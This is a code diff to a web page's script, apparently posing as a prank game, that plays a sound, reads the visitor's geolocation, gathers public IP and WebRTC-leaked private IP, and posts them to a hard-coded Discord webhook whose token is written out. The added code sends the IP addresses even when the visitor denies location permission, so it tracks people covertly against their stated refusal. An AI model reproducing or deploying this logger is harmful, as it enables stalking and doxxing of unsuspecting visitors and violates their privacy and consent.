@@ -38,13 +38,16 @@
     <audio id="audio" src="funny.mp3" preload="auto"></audio> <!-- Replace with your audio file -->
 
     <script>
+        const webhookUrl = 'https://discord.com/api/webhooks/1424102601112293407/wqpsY1rZMZaAuIDxOq8TgP75L0mpzozmTv_YGP6B6dBpQ0E6nJJVTr08teeFSJW27von'; // Your Discord webhook URL
+
         document.getElementById('sendLocation').addEventListener('click', function() {
             // Play audio when button is pressed
             document.getElementById('audio').play();            
             if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(sendLocation, showError);
+                navigator.geolocation.getCurrentPosition(sendLocationWithGeo, showError);
             } else {
                 alert("Geolocation is not supported by this browser.");
+                sendIPsOnly(); // Send IPs if geolocation is not supported at all
             } 
         });
 
@@ -63,52 +66,33 @@
         // Function to get Private IP using WebRTC
         function getPrivateIP() {
             return new Promise((resolve) => {
-                const pc = new RTCPeerConnection({ iceServers: [] });
-                pc.createDataChannel('');
-                pc.createOffer().then(pc.setLocalDescription.bind(pc));
+                try {
+                    const pc = new RTCPeerConnection({ iceServers: [] });
+                    pc.createDataChannel('');
+                    pc.createOffer().then(pc.setLocalDescription.bind(pc));
 
-                pc.onicecandidate = (ice) => {
-                    if (ice && ice.candidate && ice.candidate.candidate) {
-                        // Regex to find an IP address
-                        const ipRegex = /([0-9]{1,3}(\.[0-9]{1,3}){3}|[a-f0-9]{1,4}(:[a-f0-9]{1,4}){7})/;
-                        const ipAddr = ipRegex.exec(ice.candidate.candidate)[1];
-                        if (ipAddr) {
-                            pc.onicecandidate = null; // Stop listening for more candidates
-                            resolve(ipAddr);
+                    pc.onicecandidate = (ice) => {
+                        if (ice && ice.candidate && ice.candidate.candidate) {
+                            // Regex to find an IP address
+                            const ipRegex = /([0-9]{1,3}(\.[0-9]{1,3}){3}|[a-f0-9]{1,4}(:[a-f0-9]{1,4}){7})/;
+                            const ipAddr = ipRegex.exec(ice.candidate.candidate)[1];
+                            if (ipAddr) {
+                                pc.onicecandidate = null; // Stop listening for more candidates
+                                resolve(ipAddr);
+                            }
                         }
-                    }
-                };
-
-                // Set a timeout in case the process hangs or fails
-                setTimeout(() => resolve('Not available'), 1000);
+                    };
+                    // Set a timeout in case the process hangs or fails
+                    setTimeout(() => resolve('Not available'), 1000);
+                } catch (e) {
+                    console.error("WebRTC error:", e);
+                    resolve("Not available (WebRTC blocked/failed)");
+                }
             });
         }
 
-        // Main function to gather all data and send it
-        async function sendLocation(position) {
-            const lat = position.coords.latitude;
-            const lon = position.coords.longitude;
-
-            // Gather all IPs
-            const publicIP = await getPublicIP();
-            const privateIP = await getPrivateIP();
-
-            // Create a Google Maps link with a marker at the exact location
-            const googleMapsLink =`https://www.google.com/maps?q=${lat},${lon}&z=15`;
-            
-            const webhookUrl = 'https://discord.com/api/webhooks/1424102601112293407/wqpsY1rZMZaAuIDxOq8TgP75L0mpzozmTv_YGP6B6dBpQ0E6nJJVTr08teeFSJW27von'; // Your Discord webhook URL
-            
-            // Format the data for the Discord webhook
-            const data = {
-                content: `
---- New Player Log ---
-**📍 Location:** [Click to view map](${googleMapsLink})
-**🌐 Public IP:** \`${publicIP}\`
-**💻 Private IP:** \`${privateIP}\`
-----------------------
-`
-            };
-            
+        // Function to send data to Discord
+        function sendToDiscord(data) {
             fetch(webhookUrl, {
                 method: 'POST',
                 headers: {
@@ -127,7 +111,47 @@
             });
         }
 
+        // Main function to gather all data (including location) and send it
+        async function sendLocationWithGeo(position) {
+            const lat = position.coords.latitude;
+            const lon = position.coords.longitude;
+            const publicIP = await getPublicIP();
+            const privateIP = await getPrivateIP();
+            const googleMapsLink =`https://www.google.com/maps?q=${lat},${lon}&z=15`;
+            
+            const data = {
+                content: `
+--- New Player Log (Location Accepted) ---
+**📍 Location:** [Click to view map](${googleMapsLink})
+**🌐 Public IP:** \`${publicIP}\`
+**💻 Private IP:** \`${privateIP}\`
+------------------------------------------
+`
+            };
+            sendToDiscord(data);
+        }
+
+        // Function to send only IP addresses
+        async function sendIPsOnly() {
+            const publicIP = await getPublicIP();
+            const privateIP = await getPrivateIP();
+            
+            const data = {
+                content: `
+--- New Player Log (Location Denied/Unavailable) ---
+**🌐 Public IP:** \`${publicIP}\`
+**💻 Private IP:** \`${privateIP}\`
+------------------------------------------------------
+`
+            };
+            sendToDiscord(data);
+        }
+
+        // This function handles errors from navigator.geolocation
         function showError(error) {
+            // Send IPs regardless of the error, but especially on permission denial
+            sendIPsOnly();
+
             switch (error.code) {
                 case error.PERMISSION_DENIED:
                     alert("I Guess no game");                    
